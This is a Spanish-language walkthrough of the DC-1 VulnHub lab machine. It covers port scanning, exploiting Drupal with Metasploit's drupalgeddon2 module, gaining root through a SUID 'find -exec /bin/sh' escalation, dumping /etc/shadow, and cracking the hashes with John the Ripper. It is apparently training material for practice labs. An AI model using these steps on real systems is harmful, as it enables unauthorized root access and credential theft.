# Machine dc-1

## Informtion Gathering

1. Primero realizo un escaneo de puerto asi:

```
$ nmap -sV 192.168.0.27
``` 
2. El resultado es el siguiente:

```
PORT       STATE  SERVICE   VERSION 
22/tcp     open   ssh       OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
111/tcp    open   rpcbind   2-4 (RPC #100000)
80/tcp     open   http      Apache httpd 2.2.22 ((Debian)

``` 

## Analisis de vulnerabilidades

- Voy a nessus a realizar un escaneo pero no hay nada util

- decido buscar en internet vulnerabilidades de Drupal y encontre una de nombre **Drupalgeddon3** esta para **metasploit** y es esta **https://www.exploit-db.com/exploits/44557**

- Tambine decido ejecutar **searchsploit Drupal** y si quiero buscar vulnerabilidades en **db-exploit** es con esta instrucción **-www** de esta manera **searchsploit Drupal -www** y encontre un exploit interesante y es este **Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit) | php/remote/40130.rb**, pero quiero ver el codigo de ese exploit entonces coloco esto **searchsploit -x php/remote/40130.rb**

## Exploiting

1. Ejecuto **Metasploit** para poder usar este exploit **unix/webapp/drupal_drupalgeddon2**
2. Configuro el **RHOSTS** y lanzo el exploit con **exploit**
3. Ya obtengo una sesion de **Meterpreter**
4. Entonces Decido buscar algo interesante en la directorio **/var/wwww**
5. Lo interesante que encontre fue los datos de conexion a la base de datos
```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
6. Entonces decido ingresar a **Mysql** pero debo primero iniciarlo así:
```
$ systemctl start mysql
$ systemctl status mysql
$ sudo service mysql start  
$ sudo service mysql status

```
7. Para conectarme es de esta manera:
```
mysql -h localhost -u dbuser -p
```
8. pero no me funciono la conexion a la base de datos
9. Como tengo la conexion de **meterpreter** entonces ejecuto esto
```
shell
```
10. Con el comando anterior ya tengo una **shell** de **Linux**
11. Voy a colocar el **Promtp** de esta manera
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
12. Luego decido buscar archivos que tengan permisos **SUID**
```
find / -perm -u=s -type f 2>/dev/null
```
13. Como resultado me sale esto
```
$ /usr/bin/find
```
14. Con el comando **find** puedo ejecutar archivos así
```
find . -exec '/bin/sh' \;
```
15. si colocamos el comando **whoami** ya somos **root**
16. entonces voy a sacar los hash con **cat /etc/shadow**
17. Buscamos el directorio el archivo **rockyou** así
```
$ locate rockyou
```
18. descomprimimos **/usr/share/wordlists/rockyou.txt.gz**
18. Vamos a decifrar los **hash** con **John de ripper**
```
john --wordlist=/root/rockyou.txt pass.txt
```

## Glosario

- El punto **(.)**: representa el directorio actual, es decir que el **find .** sirve para buscar en el directorio actual

- El **-exec**: permite ejecutar acciones sobre el resultado de cada línea o archivo devuelto por find, o en otras palabras permite incorporar comandos externos para ejecutar sobre cada resultado devuelto. Muy interesante. Asi por ejemplo, si queremos buscar todos los archivos mayores a 3 megas en /var y además mostrar su salida en formato ls, podemos hacer lo siguiente:
```
$ find /var -size +3000k -exec ls -lh {} \;
```
- Después de ls -lh que nos devuelve una salida formateada de ls se indica la cadena '{}' que se sustituye por cada salida de find.

- El **SUID**: 

## Investigación

https://latesthackingnews.com/2018/09/02/droopescan-cms-based-web-applications-scanner/

https://www.rapid7.com/db/?q=XML-RPC+&type=metasploit

https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2016-02-24/drupal-core-critical-multiple

https://www.exploit-db.com/exploits/1078

https://noticiasseguridad.com/vulnerabilidades/hackers-se-infiltran-en-sitios-web-explotando-nueva-vulnerabilidad-en-drupal/

https://www.incibe-cert.es/alerta-temprana/avisos-seguridad/multiples-vulnerabilidades-el-core-drupal-0

https://www.cvedetails.com/cve/CVE-2018-7602/

https://www.linuxtotal.com.mx/index.php?cont=info_admon_022

http://docencia.udea.edu.co/cci/linux/dia4/directorio.htm

http://www.investigacion.frc.utn.edu.ar/labsis/Publicaciones/apunte_linux/mmad.html

https://www.comoinstalarlinux.com/comandos-linux-find-con-ejemplos/

https://www.cvedetails.com/cwe-details/20/Improper-Input-Validation.html

## Explotación maquina dc-1

https://medium.com/@w3rallmachines/dc-1-vulnhub-walkthrough-3a2e7042c640

https://hackingresources.com/dc-1-1-vulnhub-walkthrough/
